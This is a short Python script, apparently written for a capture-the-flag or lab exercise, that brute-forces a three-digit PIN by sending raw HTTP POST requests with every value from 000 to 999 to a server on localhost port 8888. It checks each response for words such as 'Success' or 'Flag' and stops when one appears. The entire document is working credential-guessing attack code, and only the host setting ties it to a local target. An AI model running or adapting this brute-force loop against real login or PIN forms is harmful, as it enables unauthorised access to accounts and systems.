import socket
import time  

HOST = '127.0.0.1'
PORT = 8888

for i in range(1000):
    guess = str(i).zfill(3)
    data = f"pin={guess}"

    req = (
        "POST / HTTP/1.1\r\n"
        f"Host: {HOST}:{PORT}\r\n"
        "Content-Type: application/x-www-form-urlencoded\r\n"
        f"Content-Length: {len(data)}\r\n"
        "Connection: close\r\n"
        "\r\n"
        f"{data}"
    )

    try:
        sock = socket.socket()
        sock.connect((HOST, PORT))
        sock.send(req.encode())

        result = b""
        while True:
            chunk = sock.recv(1024)
            if not chunk:
                break
            result += chunk

        output = result.decode(errors="ignore")

      
        print(f"Trying PIN: {guess}")
        print(f"Request sent:\n{req}")
        print(f"Server response (truncated):\n{output[:200]}")

        
        if "Success" in output or "Welcome" in output or "Correct" in output or "Flag" in output:
            print(f" PIN FOUND: {guess}")
            break
        else:
            print(f"Try {guess} -> no luck")

        sock.close()

        
        time.sleep(0.5)

    except Exception as err:
        print(f"[x] pin {guess} failed: {err}")
        continue